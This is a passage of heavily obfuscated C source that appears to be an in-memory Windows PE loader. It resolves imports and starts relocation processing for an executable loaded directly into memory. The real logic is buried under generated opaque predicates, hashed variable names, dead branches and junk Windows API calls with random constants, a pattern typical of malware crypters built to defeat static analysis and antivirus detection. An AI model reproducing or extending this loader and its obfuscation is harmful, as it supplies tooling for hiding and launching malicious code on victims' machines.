          {
            vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = (unsigned int) 0;
          }
        }
        if (((v059d122f3e8b86424a18796664ff3d31_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v059d122f3e8b86424a18796664ff3d31_prime_opaque == ((unsigned int) 2)))
        {
          ve609b7fe6984b8a85f770a041153c694_computation_opaque = ve609b7fe6984b8a85f770a041153c694_computation_opaque + ((unsigned int) 2);
        }
      }

    }

    unsigned int v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque = v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque;
    {
      unsigned int vbfac0b39da1d414062cc828195563135_useless_opaque = (unsigned int) 3635847672;
      unsigned int vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque = (unsigned int) (&vbfac0b39da1d414062cc828195563135_useless_opaque);
      unsigned int v605b78c62cb95d5202d103b79201373f_true_opaque = (((vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque * vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque) + vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
        {
          vbfac0b39da1d414062cc828195563135_useless_opaque = vbfac0b39da1d414062cc828195563135_useless_opaque == v605b78c62cb95d5202d103b79201373f_true_opaque;
          if (v605b78c62cb95d5202d103b79201373f_true_opaque)
          {
            v47f7cc578d96325420a92a198f8a37ea_useless_opaque = vff8febe68dcfb359a14f4f7f6865372d_computation_opaque == v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque;
            ve609b7fe6984b8a85f770a041153c694_computation_opaque = vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque == v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque;
            v605b78c62cb95d5202d103b79201373f_true_opaque = vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque / v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque;
            v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque < vbfac0b39da1d414062cc828195563135_useless_opaque;
            vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque = v47f7cc578d96325420a92a198f8a37ea_useless_opaque * vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque;
          }
        }
        for (int i = 0; new_pe->import_descriptors[i].OriginalFirstThunk != 0; i++)
        {
          if (v605b78c62cb95d5202d103b79201373f_true_opaque)
          {
            if (v605b78c62cb95d5202d103b79201373f_true_opaque)
            {
              if (v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
                {
                  char *module_name = new_pe->data + new_pe->import_descriptors[i].Name;
                  HMODULE import_module = ((HMODULE (__stdcall *)(const char *)) kernel_library_function_addresses[1])(module_name);
                  if (import_module == 0)
                    return -1;
                  if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                  {
                    if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                    {
                      unsigned long v9ff112080ecbc07d1cc94aaa9d853398 = (unsigned long) 0xaba9551d;
                      unsigned long vbdc33dcaff7eab843e5566d5b943e9ce = (unsigned long) 0x10b37d0f;
                      if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                      {
                        v47f7cc578d96325420a92a198f8a37ea_useless_opaque = v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque / ve609b7fe6984b8a85f770a041153c694_computation_opaque;
                        ve609b7fe6984b8a85f770a041153c694_computation_opaque = vbfac0b39da1d414062cc828195563135_useless_opaque < v47f7cc578d96325420a92a198f8a37ea_useless_opaque;
                        v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque = v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque || vbfac0b39da1d414062cc828195563135_useless_opaque;
                        ve609b7fe6984b8a85f770a041153c694_computation_opaque = v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque / ((unsigned int) 122);
                      }
                      void * v8f12f077ba20fcb990360ba27cc3ba9a = (void *) 0x5dca4498;
                      int vdbe36e6c3f87aba53f3f8963c0fa6786 = (int) 0x5d8c3478;
                      int v6203abcdae3110fa98b0a51c72d85c10 = (int) 0x9631acb9;
                      v6203abcdae3110fa98b0a51c72d85c10 = GetLocaleInfoW(v9ff112080ecbc07d1cc94aaa9d853398, vbdc33dcaff7eab843e5566d5b943e9ce, v8f12f077ba20fcb990360ba27cc3ba9a, vdbe36e6c3f87aba53f3f8963c0fa6786);
                    }
                    void * vadea65030704f7fa6dd61d84b5a697f2 = (void *) 0x524acdb0;
                    unsigned long vc9a480b6767ffea15b99cbadcc20cc2e = (unsigned long) 0x323aa4d0;
                    unsigned long vd4ec0169a618abc5620a80fb7b74e23f = (unsigned long) 0x39701517;
                    vd4ec0169a618abc5620a80fb7b74e23f = SnmpListen(vadea65030704f7fa6dd61d84b5a697f2, vc9a480b6767ffea15b99cbadcc20cc2e);
                  }
                  IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA *) (new_pe->data + new_pe->import_descriptors[i].OriginalFirstThunk);
                  IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA *) (new_pe->data + new_pe->import_descriptors[i].FirstThunk);
                  for (int i = 0; lookup_table[i].u1.AddressOfData != 0; i++)
                  {
                    void *function_handle = 0;
                    DWORD lookup_addr = lookup_table[i].u1.AddressOfData;
                    if ((lookup_addr & 0x80000000UL) == 0)
                    {
                      IMAGE_IMPORT_BY_NAME *image_import = (IMAGE_IMPORT_BY_NAME *) (new_pe->data + lookup_addr);
                      char *funct_name = (char *) (&image_import->Name);
                      function_handle = ((void *(__stdcall *)(HMODULE, const char *)) kernel_library_function_addresses[0])(import_module, funct_name);
                    }
                    else
                    {
                      function_handle = ((void *(__stdcall *)(HMODULE, const char *)) kernel_library_function_addresses[0])(import_module, (LPSTR) lookup_addr);
                    }
                    if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
                    {
                      if (function_handle == 0)
                      {
                        if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
                        {
                          void * vae069522cf6efe9f13b24a90978a09f1 = (void *) 0x18de0bb4;
                          unsigned long v40dcb339bb4ed0de3a0fe345c54ba45b = (unsigned long) 0x71cd0c2b;
                          unsigned long vc395559783d3fbf77948bdf11bc466fe = (unsigned long) 0x7d8addf6;
                          vc395559783d3fbf77948bdf11bc466fe = SnmpListen(vae069522cf6efe9f13b24a90978a09f1, v40dcb339bb4ed0de3a0fe345c54ba45b);
                        }
                        if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                        {
                          unsigned long v2e4937cf75b2cada623a05d7b1e65cd4 = (unsigned long) 0xc332e67e;
                          unsigned long va933d9a03426cdecc2663223dac2c1ee = (unsigned long) 0x4f76ca40;
                          va933d9a03426cdecc2663223dac2c1ee = MsiGetActiveDatabase(v2e4937cf75b2cada623a05d7b1e65cd4);
                        }
                        return -1;
                      }
                      address_table[i].u1.Function = (DWORD) function_handle;
                    }
                  }

                }
              }
            }
          }
        }

        return 0;
      }
      unsigned int v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque = (unsigned int) 1521848408;
      unsigned int vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque = (unsigned int) 0;
      unsigned int v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = (unsigned int) 3;
      unsigned int v87e035b102d4d441954704ba7a5eeb6b_computation_opaque = (unsigned int) (&v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque);
      if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
      {
        void * vf10b4f8564ab20c51e0b972027adcc0f = (void *) 0x7d751879;
        int v27d61c71b8f7f1e3cbf4531d7597ac39 = (int) 0x918854f3;
        v27d61c71b8f7f1e3cbf4531d7597ac39 = RemoveDllDirectory(vf10b4f8564ab20c51e0b972027adcc0f);
        if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
        {
          void * vff39388e12ae92417ef73bf82c80ffd3 = (void *) 0x72725737;
          void * v0a9609227dce95f4f647fa2d3934fc6b = (void *) 0x5bdfeada;
          if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
          {
            if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
            {
              unsigned long va50980a77babbedff0725a844fa56cb8 = (unsigned long) 0x6fd4a7c6;
              unsigned long v4131009fbe604d6517a6e194dab75dc8 = (unsigned long) 0xdae95f22;
              v4131009fbe604d6517a6e194dab75dc8 = GetModuleFileNameA(vff39388e12ae92417ef73bf82c80ffd3, v0a9609227dce95f4f647fa2d3934fc6b, va50980a77babbedff0725a844fa56cb8);
              if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque * v47f7cc578d96325420a92a198f8a37ea_useless_opaque;
                v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque || vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque;
                ve609b7fe6984b8a85f770a041153c694_computation_opaque = v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque < ((unsigned int) 21);
              }
            }
          }
        }
      }
      v87e035b102d4d441954704ba7a5eeb6b_computation_opaque = (v87e035b102d4d441954704ba7a5eeb6b_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v87e035b102d4d441954704ba7a5eeb6b_computation_opaque < ((unsigned int) 3))
      {
        if (v605b78c62cb95d5202d103b79201373f_true_opaque)
        {
          v87e035b102d4d441954704ba7a5eeb6b_computation_opaque = (unsigned int) 3;
        }
      }
      while (vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque != ((unsigned int) 1))
      {
        if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
        {
          if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
          {
            v605b78c62cb95d5202d103b79201373f_true_opaque = v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque | v47f7cc578d96325420a92a198f8a37ea_useless_opaque;
            if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
            {
              if (v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                vbfac0b39da1d414062cc828195563135_useless_opaque = v87e035b102d4d441954704ba7a5eeb6b_computation_opaque / v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque;
              }
            }
            v47f7cc578d96325420a92a198f8a37ea_useless_opaque = v605b78c62cb95d5202d103b79201373f_true_opaque - v47f7cc578d96325420a92a198f8a37ea_useless_opaque;
            if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
            {
              v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque = vff8febe68dcfb359a14f4f7f6865372d_computation_opaque == vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque;
              if (v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
                {
                  vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque < v605b78c62cb95d5202d103b79201373f_true_opaque;
                }
                vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque = v605b78c62cb95d5202d103b79201373f_true_opaque != vff8febe68dcfb359a14f4f7f6865372d_computation_opaque;
              }
            }
          }
          unsigned long v8b59b532297d60c83f8ec11ee987f6e4 = (unsigned long) 0x840e0452;
          if (v605b78c62cb95d5202d103b79201373f_true_opaque)
          {
            unsigned long v317c8629cd9743bcf7968e71b6636a0c = (unsigned long) 0x82b285c9;
            if (v605b78c62cb95d5202d103b79201373f_true_opaque)
            {
              if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                void * vaea8557023b52659f7707604beb40183 = (void *) 0x790d63ff;
                long v40fd3cfd6205c83bef1282bbf4546ebe = (long) 0xf1fcc990;
                if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
                {
                  vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque * v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque;
                  v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = v87e035b102d4d441954704ba7a5eeb6b_computation_opaque / vff8febe68dcfb359a14f4f7f6865372d_computation_opaque;
                  vbfac0b39da1d414062cc828195563135_useless_opaque = ve609b7fe6984b8a85f770a041153c694_computation_opaque / vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque;
                }
                if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                {
                  vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque = ve609b7fe6984b8a85f770a041153c694_computation_opaque <= vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque;
                  if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                  {
                    v605b78c62cb95d5202d103b79201373f_true_opaque = v47f7cc578d96325420a92a198f8a37ea_useless_opaque < vff8febe68dcfb359a14f4f7f6865372d_computation_opaque;
                    v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = v47f7cc578d96325420a92a198f8a37ea_useless_opaque <= v87e035b102d4d441954704ba7a5eeb6b_computation_opaque;
                    v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque == vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque;
                    vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = vbfac0b39da1d414062cc828195563135_useless_opaque || v87e035b102d4d441954704ba7a5eeb6b_computation_opaque;
                    vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = v87e035b102d4d441954704ba7a5eeb6b_computation_opaque / ve609b7fe6984b8a85f770a041153c694_computation_opaque;
                    vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque = vbfac0b39da1d414062cc828195563135_useless_opaque != ve609b7fe6984b8a85f770a041153c694_computation_opaque;
                  }
                  v87e035b102d4d441954704ba7a5eeb6b_computation_opaque = v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque == v47f7cc578d96325420a92a198f8a37ea_useless_opaque;
                  v47f7cc578d96325420a92a198f8a37ea_useless_opaque = v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque != ve609b7fe6984b8a85f770a041153c694_computation_opaque;
                  v87e035b102d4d441954704ba7a5eeb6b_computation_opaque = vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque % v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque;
                  vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque = vff8febe68dcfb359a14f4f7f6865372d_computation_opaque / v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque;
                  vff8febe68dcfb359a14f4f7f6865372d_computation_opaque = vbfac0b39da1d414062cc828195563135_useless_opaque | v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque;
                }
                v40fd3cfd6205c83bef1282bbf4546ebe = RoUnregisterForApartmentShutdown(vaea8557023b52659f7707604beb40183);
              }
              v317c8629cd9743bcf7968e71b6636a0c = MsiGetActiveDatabase(v8b59b532297d60c83f8ec11ee987f6e4);
            }
          }
        }
        if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
        {
          if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
          {
            if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
            {
              v47f7cc578d96325420a92a198f8a37ea_useless_opaque = v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque || ve609b7fe6984b8a85f770a041153c694_computation_opaque;
              if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
              {
                v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = v87e035b102d4d441954704ba7a5eeb6b_computation_opaque == vff8febe68dcfb359a14f4f7f6865372d_computation_opaque;
                v47f7cc578d96325420a92a198f8a37ea_useless_opaque = vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque <= v605b78c62cb95d5202d103b79201373f_true_opaque;
              }
              ve609b7fe6984b8a85f770a041153c694_computation_opaque = v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque < v47f7cc578d96325420a92a198f8a37ea_useless_opaque;
              if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = vff8febe68dcfb359a14f4f7f6865372d_computation_opaque / v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque;
                v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque < vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque;
                v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque = v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque - vbfac0b39da1d414062cc828195563135_useless_opaque;
              }
            }
            void * vd1f75c2f8b97104305f2ef52cc29b871 = (void *) 0x315f4491;
            long v51215c112d02863d9f507b9ad852a8b2 = (long) 0xb159db3c;
            if (v605b78c62cb95d5202d103b79201373f_true_opaque)
            {
              if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                unsigned long vbbfdaa9babcfd04da235256af33e1655 = (unsigned long) 0xc61bb58f;
                if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
                {
                  void * vb47338d13bedf5f96c271fb1d2f48211 = (void *) 0x6dd830f8;
                  int v1036930f17b0468e8d198a733f03a534 = (int) 0x0f109426;
                  void * veffa3e3b36681d533c6102a5afaa672b = (void *) 0x1155d546;
                  int vc8abe3a3286cd7537e674f2196071e33 = (int) 0xee6ff725;
                  int vfe960a2dcff182afc1297c6bf5dbd7b7 = (int) 0x4c2d3a9b;
                  vfe960a2dcff182afc1297c6bf5dbd7b7 = IdnToNameprepUnicode(vbbfdaa9babcfd04da235256af33e1655, vb47338d13bedf5f96c271fb1d2f48211, v1036930f17b0468e8d198a733f03a534, veffa3e3b36681d533c6102a5afaa672b, vc8abe3a3286cd7537e674f2196071e33);
                }
              }
              if (v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                v51215c112d02863d9f507b9ad852a8b2 = RoUnregisterForApartmentShutdown(vd1f75c2f8b97104305f2ef52cc29b871);
              }
            }
          }
        }
        v87e035b102d4d441954704ba7a5eeb6b_computation_opaque += (unsigned int) 2;
        vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque = (unsigned int) 1;
        v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = (unsigned int) 3;
        while ((v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque * v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque) <= v87e035b102d4d441954704ba7a5eeb6b_computation_opaque)
        {
          if (v605b78c62cb95d5202d103b79201373f_true_opaque)
          {
            if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
            {
              if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
              {
                v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque = v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque / v605b78c62cb95d5202d103b79201373f_true_opaque;
                v87e035b102d4d441954704ba7a5eeb6b_computation_opaque = v87e035b102d4d441954704ba7a5eeb6b_computation_opaque != v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque;
                if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                {
                  v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque = v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque + v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque;
                  ve609b7fe6984b8a85f770a041153c694_computation_opaque = v47f7cc578d96325420a92a198f8a37ea_useless_opaque == ((unsigned int) 112);
                }
                if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
                {
                  v87e035b102d4d441954704ba7a5eeb6b_computation_opaque = v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque * v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque;
                }
                v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = v605b78c62cb95d5202d103b79201373f_true_opaque / vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque;
                vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque = vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque <= v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque;
                v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = v605b78c62cb95d5202d103b79201373f_true_opaque * ((unsigned int) 116);
                vc5bbd4bcc1d47fbe0f51911a7caa564b_computation_opaque = vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque * v47f7cc578d96325420a92a198f8a37ea_useless_opaque;
                v47f7cc578d96325420a92a198f8a37ea_useless_opaque = vff8febe68dcfb359a14f4f7f6865372d_computation_opaque % v87e035b102d4d441954704ba7a5eeb6b_computation_opaque;
              }
              if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
              {
                v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque = vbfac0b39da1d414062cc828195563135_useless_opaque || v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque;
                v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque == v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque;
                v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = v87e035b102d4d441954704ba7a5eeb6b_computation_opaque < v7041bf8cfdebd30759fbd0d1597675fc_useless_opaque;
                v8f57289a65261f9bd215af2a4bd3ef3c_computation_opaque = ve609b7fe6984b8a85f770a041153c694_computation_opaque <= ((unsigned int) 73);
              }
            }
            if (v605b78c62cb95d5202d103b79201373f_true_opaque)
            {
              if ((v87e035b102d4d441954704ba7a5eeb6b_computation_opaque % v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque) == ((unsigned int) 0))
              {
                if (((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2)))
                {
                  if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
                  {
                    unsigned long v525eb8e7c1e6e43535b83ab67a21d202 = (unsigned long) 0x566d45b3;
                    unsigned long va2b7c24ad17adc291b28df7594de685a = (unsigned long) 0xb2f09707;
                    va2b7c24ad17adc291b28df7594de685a = MsiGetActiveDatabase(v525eb8e7c1e6e43535b83ab67a21d202);
                    if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                    {
                      v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = vbfac0b39da1d414062cc828195563135_useless_opaque == v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque;
                    }
                  }
                  vcbeb04b2714c9cd871be2e4a3b36fe5c_computation_opaque = (unsigned int) 0;
                  if (!(((v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v0ea9dfcd7f8fce1d2a802d4a009e1b56_prime_opaque == ((unsigned int) 2))))
                  {
                    void * v0b2617df988712ab32bc9844f073fdb7 = (void *) 0xd6d230ef;
                    long v3e5c61f645357938298b526bb21b843d = (long) 0x9b0a5001;
                    v3e5c61f645357938298b526bb21b843d = RoUnregisterForApartmentShutdown(v0b2617df988712ab32bc9844f073fdb7);
                    if (!v605b78c62cb95d5202d103b79201373f_true_opaque)
                    {
                      unsigned long v182e1634e66163333865d6fecaeffc69 = (unsigned long) 0xde11b447;
                      unsigned long va707c630c56ecd132b879e647e17033f = (unsigned long) 0x2880c440;
                      va707c630c56ecd132b879e647e17033f = MsiGetActiveDatabase(v182e1634e66163333865d6fecaeffc69);
                    }
                  }
                }
              }
              v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque = v2f3b86587a3d5d59a35c7b9b1fdbd442_computation_opaque + ((unsigned int) 2);
            }
          }
        }

      }

      unsigned int v093d6e144552b30b9726246604586025_prime_opaque = v87e035b102d4d441954704ba7a5eeb6b_computation_opaque;
    }
  }
  unsigned int v6764e35ce8b992379deb69af4bed68bb_useless_opaque = (unsigned int) 164024137;
  unsigned int vcae7934af50dd66c8ecaebf4edde64d0_random_opaque = (unsigned int) (&v6764e35ce8b992379deb69af4bed68bb_useless_opaque);
}

void resolve_relocations(in_memory_pe *new_pe)
{
  unsigned int vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque = (unsigned int) 637050175;
  unsigned int v319cc87457360bcf28671944f259c4b4_random_opaque = (unsigned int) (&vd2a7c626d101e003767cef50d0fd1fc9_useless_opaque);
  {
    {
      unsigned int vd2cc9196524592bf88d0378fd0a1d222_useless_opaque = (unsigned int) 4279144507;
      unsigned int vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque = (unsigned int) (&vd2cc9196524592bf88d0378fd0a1d222_useless_opaque);
      unsigned int vb64227d50830527f1c5ec35a81e70f02_true_opaque = (((vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque * vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque) + vae0a8bdeff933a1353fa33004c8ef8ee_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        DWORD delta_reloc = ((DWORD) new_pe->data) - new_pe->pe_nt_header->OptionalHeader.ImageBase;
        if ((new_pe->data_directory[5].VirtualAddress != 0) && (delta_reloc != 0))
        {
